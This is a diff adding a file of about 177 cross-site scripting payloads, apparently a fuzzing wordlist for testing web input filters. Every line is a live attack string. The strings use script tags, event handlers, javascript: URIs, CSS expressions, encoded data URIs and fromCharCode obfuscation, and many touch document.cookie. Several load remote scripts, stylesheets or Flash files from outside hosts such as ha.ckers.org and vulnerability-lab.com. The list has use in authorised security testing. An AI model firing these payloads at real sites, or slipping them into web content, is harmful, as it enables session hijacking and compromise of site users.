@@ -1,0 +1,177 @@
+open()>
+location=?javascript:alert(1)>click
+"data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4=">
+<iframe src=http://vulnerability-lab.com/index.html <
+<bgsound src="javascript:alert('crosssitescripting');">
+<a href="http://www.google.com">crosssitescripting</a>
+<base href="javascript:alert('crosssitescripting');//">
+<crosssitescripting style="behavior: url(crosssitescripting.htc);">
+<crosssitescripting style="crosssitescripting:expression(alert('crosssitescripting'))"> exp/*<a style='no\\crosssitescripting:nocrosssitescripting("*//*"); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert("crosssitescripting"))'>
+</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
+<xml src="crosssitescriptingtest.xml" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>
+<t:set attributename="innerhtml" to="crosssitescripting<script defer>alert("crosssitescripting")</script>">
+<? echo('<scr)';echo('ipt>alert("crosssitescripting")</script>'); ?>
+<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("xss")>
+<img id=xss src="javascript:alert('xss');">
+<img id=xss src=`javascript:alert("'xss'")`>
+<img id=xss src=" javascript:alert('xss');">
+<img id=xss src='javascript:alert('xss')
+</title><script>alert("xss");</script>
+<script>alert("xssya")</script>
+"<script>alert('xssya')</script>
+<script>alert(1);</script>
+alert(1)>
+'"--></style></script><script>alert('xss')</script>
+<script>confirm(0);</script>
+<body/onhashchange=alert(1)><a+href=#>clickit
+"javascript:alert(2)">
+x onfocus=alert(1)>
+data:text/html, type=image>
+"http://www.google.com./">xss</a>
+write(1) autofocus><input autofocus>
+test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x</button>
+"javascript:alert(1)">x</button>
+"import" href="test.svg" />
+"x" onerror="alert(1)"></picture>
+"--><img src=x onerror=alert(1)//">
+list-style:url() onerror=alert(1)></li>
+"data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg=="></object>
+"div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div>
+mhtml:http://html5sec.org/test.html!xss.html></iframe>
+alert(1)></title><title title=></title>
+<style>@import "data:,*{x:expression(write(1))}";</style>
+<script>referenceerror.prototype.__definegetter__('name', function(){alert(1)}),x</script>
+<b><script<b></b><alert(1)</script </b></b>
+<script>document.cookie=true;</script>
+<img src=" javascript:document.cookie=true;">
+<script <b>document.cookie=true;</script>
+</title><script>document.cookie=true;</script>
+<body onload=document.cookie=true;>
+<bgsound src="javascript:document.cookie=true;">
+<link rel="stylesheet" href="javascript:document.cookie=true;">
+<iframe src="javascript:document.cookie=true;"></iframe>
+<table><td background="javascript:document.cookie=true;">
+<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
+exp/*<a style='no\\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
+<style>.crosssitescripting{background-image:url("javascript:document.cookie=true");}</style><a class=crosssitescripting></a>
+<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
+<html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="crosssitescripting<script defer>document.cookie=true</script>"></body></html>
+<a href="javascript#document.cookie=true;">
+&<script>document.cookie=true;</script>
+<img src="mocha:document.cookie=true;">
+<body onload="document.cookie=true;">
+<div style="binding: url([link to code]);">
+<style><!--</style><script>document.cookie=true;//--></script>
+<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+<xml src="javascript:document.cookie=true;">
+>"<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+>"<img src="jav ascript:document.cookie=true;">
+>"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>
+>"<iframe src="javascript:document.cookie=true;>
+>"<input type="image" src="javascript:document.cookie=true;">
+>"<img dynsrc="javascript:document.cookie=true;">
+>"<br size="&{document.cookie=true}">
+>"<style>li {list-style-image: url("javascript:document.cookie=true;");</style><ul><li>crosssitescripting
+>"<frameset><frame src="javascript:document.cookie=true;"></frameset>
+>"<div style="background-image: url(javascript:document.cookie=true;)">
+>"<img style="crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)">
+>"<style type="text/javascript">document.cookie=true;</style>
+>"<base href="javascript:document.cookie=true;//">
+>"<xml id="crosssitescripting"><i><b><img src="javas<!-- -->cript:document.cookie=true"></b></i></xml><span datasrc="#crosssitescripting" datafld="b" dataformatas="html"></span>
+>"<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-
+>"<input type="image" dynsrc="javascript:document.cookie=true;">
+>"<a href="about:<script>document.cookie=true;</script>">
+>"<div style="behaviour: url([link to code]);">
+>"<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+>"<script>document.cookie=true;//--></script>
+>"<img src="blah>" onmouseover="document.cookie=true;">
+>"<div datafld="b" dataformatas="html" datasrc="#x"></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>
+-1<script>document.cookie=true;</script>
+-1<img src=" javascript:document.cookie=true;">
+-1<script <b>document.cookie=true;</script>
+-1</title><script>document.cookie=true;</script>
+-1<body onload=document.cookie=true;>
+-1<bgsound src="javascript:document.cookie=true;">
+-1<link rel="stylesheet" href="javascript:document.cookie=true;">
+-1<iframe src="javascript:document.cookie=true;"></iframe>
+-1<table><td background="javascript:document.cookie=true;">
+-1<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
+-1exp/*<a style='no\\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
+-1<style type="text/css">body{background:url("javascript:document.cookie=true")}</style>
+-1<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
+-1<html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="crosssitescripting<script defer>document.cookie=true</script>"></body></html>
+-1<a href="javascript#document.cookie=true;">
+-1&<script>document.cookie=true;</script>
+-1<img src="mocha:document.cookie=true;">
+-1<a href="about:<script>document.cookie=true;</script>">
+-1<div style="behaviour: url([link to code]);">
+-1<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+-1<script>document.cookie=true;//--></script>
+-1<img src="blah>" onmouseover="document.cookie=true;">
+-1<div datafld="b" dataformatas="html" datasrc="#x"></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>
+>"<script>alert(document.cookie)</script>@gmail.com
+<script>alert(document.cookie)</script>@gmail.com
+<iframe src=http://vulnerability-lab.com>1337+1
+<html><body>
+'';!--"<crosssitescripting>=&{()}
+<iframe src=http://www.vulnerability-lab.com>
+<script>alert(document.cookie)</script> <script>alert(document.cookie)</script>@gmail.com
+<!--[if gte ie 4]> <script>alert('crosssitescripting');</script> <![endif]-->
+<object type="application/x-shockwave-flash" data="http://www.vulnerability-lab.com/hack.swf" width="300" height="300">
+<script src=http://vulnerability-lab.com/crosssitescripting.js?<b>
+<script a=">" src="http://vulnerability-lab.com/crosssitescripting.js"></script>
+</title><script>alert("crosssitescripting");</script>
+<img src=javascript:alert("crosssitescripting")>
+<img src=javascript:alert(string.fromcharcode(88,83,83))>
+<img src="javascript:alert('crosssitescripting')"
+<img src='vbscript:msgbox("crosssitescripting")'>
+<meta http-equiv="refresh" content="0;url=javascript:alert('crosssitescripting');">
+<meta http-equiv="link" content="<http://vulnerability-lab.com/crosssitescripting.css>; rel=stylesheet">
+<object type="text/x-scriptlet" data="http://vulnerability-lab.com/scriptlet.html"></object>
+<style>@import'http://vulnerability-lab.com/crosssitescripting.css';</style>
+<style type="text/css">body{background:url("javascript:alert('crosssitescripting')")}</style>
+<div style="background-image: url(javascript:alert('crosssitescripting'))">
+<layer src="http://vulnerability-lab.com/script.html"></layer>
+<body background="javascript:alert('crosssitescripting')">
+<bgsound id=xss src="javascript:alert('xss');">
+<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">
+<div id=xss style="background-image: url(javascript:alert('xss'))">
+<frameset><frame id=xss src="javascript:alert('xss');"></frameset>
+<style>@im\\port'\\ja asc ipt:alert("xss")';</style>
+<style>.xss{background-image:url("javascript:alert('xss')");}</style><a class=xss></a>
+<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('xss')></object>
+<xml id="xss"><i><b><img id=xss src="javas<!-- -->cript:alert('xss')"></b></i></xml><span dataid=xss src="#xss" datafld="b" dataformatas="html"></span>
+<? echo('<scr)';echo('ipt>alert("xss")</script>'); ?>
+//--></script>">'><script>alert(string.fromcharcode(88,83,83))</script>
+<script <b>=alert('xss');"></script>
+<style>li {list-style-image: url("javascript:alert('xss');</style><ul><li>xss
+<a href="javascript#alert('xss');">
+&<script>alert('xss');</script>">
+<div id=xss style="binding: url(javascript:alert('xss'));">
+![cdata[<!--]]<script>alert('xss');//--></script>
+<img id=xss src="blah>"onmouseover="alert('xss');">
+[a][a]script>alert('xss');[a][a]/script>
+<input id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+<keygen id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+<body id=xss onscroll=eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<iframe id=xss / /onload=alert(/xss/)></iframe>
+<iframe id=xss "onload=alert(/xss/)></iframe>
+" onfocus=alert(xss) "> <"
+" onclick=alert(xss) ">
+'""><script language="javascript"> alert('x s s');</script>
+'></select><script>alert(xss)</script>
+a="get";b="url";c="javascript:";d="alert('xss');";eval(a+b+c+d);
+data:text/html;charset=utf-7;base64,ij48l3rpdgxlpjxzy3jpchq+ywxlcnqomtmznyk8l3njcmlwdd4=
+<img id=xss src=`javascript:alert("rsnake says, 'xss'")`>
+<script id=xss src=http://ha.ckers.org/xss.js?<b>
+<img dynid=xss src="javascript:alert('xss')">
+<layer id=xss src="http://ha.ckers.org/scriptlet.html"></layer>
+<meta http-equiv="link" content="<http://ha.ckers.org/xss.css>; rel=stylesheet">
+<img id=xss src="livescript:[code]">
+<div style="background-image: url(javascript:alert('xss'))">
+<xss style="xss:expression(alert('xss'))">
+geturl("javascript:alert('xss')")
+<xml id=xss src="http://ha.ckers.org/xsstest.xml" id=i></xml>
+<? echo('<scr)';
+<script a=">" '' id=xss src="http://ha.ckers.org/xss.js"></script>
+<script>document.write("<scri");</script>pt id=xss src="http://ha.ckers.org/xss.js"></script>
